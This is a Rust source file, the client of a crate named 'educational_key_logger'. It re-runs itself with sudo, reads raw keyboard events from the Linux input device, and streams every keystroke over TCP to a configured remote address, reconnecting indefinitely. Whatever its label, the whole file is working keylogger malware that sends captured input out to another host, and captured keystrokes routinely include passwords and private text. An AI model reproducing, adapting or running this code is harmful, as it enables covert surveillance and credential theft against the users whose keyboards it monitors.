mod keylogger;
use educational_key_logger::IP_PORT;
use keylogger::{get_device_file, get_key_event};
use log::{error, info, warn};
use std::{
    io::Write,
    net::TcpStream,
    process::{Command, exit},
    thread,
    time::Duration,
};

fn main() {
    #[cfg(not(target_os = "linux"))]
    compile_error!("Linux is the only viable target.");
    // #[cfg(debug_assertions)]
    {
        if std::env::var_os("RUST_LOG").is_none() {
            unsafe {
                std::env::set_var("RUST_LOG", "info");
            }
        }
        env_logger::init();
    }
    request_sudo();
    const RETRY_SEC: u64 = 3;
    loop {
        match TcpStream::connect(IP_PORT) {
            Ok(mut stream) => {
                info!("Connected to {}.", IP_PORT);
                let device = match get_device_file() {
                    Ok(device) => device,
                    Err(err) => {
                        error!("Unable to obtain device\n{}", err);
                        return;
                    }
                };
                loop {
                    thread::sleep(Duration::from_millis(10));
                    let key_event = match get_key_event(&device.0, &device.1) {
                        Ok(key_event) => key_event,
                        Err(err) => {
                            error!("Unable to obtain InputEvent\n{}", err);
                            return;
                        }
                    };
                    if !key_event.is_key_event() {
                        continue;
                    };
                    let encoded = postcard::to_allocvec(&key_event)
                        .expect("Encoding InputEvent from client side should not fail.");
                    let size = encoded.len();
                    debug_assert!(
                        size <= u8::MAX.into(),
                        "Encoded InputEvent should never be larger than 255 bytes."
                    );
                    if let Err(err) = stream.write_all(&(size as u8).to_be_bytes()) {
                        warn!(
                            "Failed to send InputEvent size to {}: {}. Trying again in {} seconds.",
                            IP_PORT, err, RETRY_SEC
                        );
                        thread::sleep(Duration::from_secs(RETRY_SEC));
                        break;
                    }
                    if let Err(err) = stream.write_all(&encoded) {
                        warn!(
                            "Failed to send InputEvent to {}: {}. Trying again in {} seconds.",
                            IP_PORT, err, RETRY_SEC
                        );
                        thread::sleep(Duration::from_secs(RETRY_SEC));
                        break;
                    };
                }
            }
            Err(err) => {
                warn!(
                    "Failed to connect to {}: {}. Trying again in {} seconds.",
                    IP_PORT, err, RETRY_SEC
                );
                thread::sleep(Duration::from_secs(RETRY_SEC));
            }
        }
    }
}
#[must_use]
fn is_sudo() -> bool {
    unsafe { libc::geteuid() == 0 }
}

fn request_sudo() {
    if is_sudo() {
        return;
    }
    let args: Vec<String> = std::env::args().collect();
    let mut cmd = Command::new("sudo");
    cmd.args(&args);
    match cmd.status() {
        Ok(status) => exit(status.code().unwrap_or(1)),
        Err(e) => {
            error!("Failed to restart with sudo: {}", e);
            exit(1);
        }
    }
}
